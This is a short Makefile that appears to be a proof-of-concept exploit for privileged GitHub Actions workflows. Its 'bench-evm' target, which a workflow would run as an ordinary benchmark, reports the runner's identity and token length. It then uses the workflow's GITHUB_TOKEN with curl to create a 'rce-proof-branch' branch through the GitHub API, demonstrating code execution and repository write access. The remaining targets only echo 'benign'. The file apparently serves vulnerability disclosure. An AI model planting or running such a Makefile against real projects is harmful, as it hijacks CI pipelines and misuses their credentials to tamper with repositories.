.PHONY: bench-evm benchmark-acala benchmark-karura benchmark-mandala benchmark-module

bench-evm:
	@echo "=== ATTACKER-CONTROLLED MAKEFILE EXECUTING IN PRIVILEGED WORKFLOW ==="
	@echo "whoami=$$(id -un) host=$$(hostname)"
	@echo "repo=$$GITHUB_REPOSITORY event=$$GITHUB_EVENT_NAME"
	@echo "token_bytes=$$(printf %s "$$GITHUB_TOKEN" | wc -c)"
	@curl -sS -o /tmp/ref_resp.json -w "contents_write_api_status=%{http_code}\n" \
	  -X POST -H "Authorization: Bearer $$GITHUB_TOKEN" -H "Accept: application/vnd.github+json" \
	  "$$GITHUB_API_URL/repos/$$GITHUB_REPOSITORY/git/refs" \
	  -d '{"ref":"refs/heads/rce-proof-branch","sha":"'"$$GITHUB_SHA"'"}'

benchmark-acala benchmark-karura benchmark-mandala benchmark-module:
	@echo "benign"
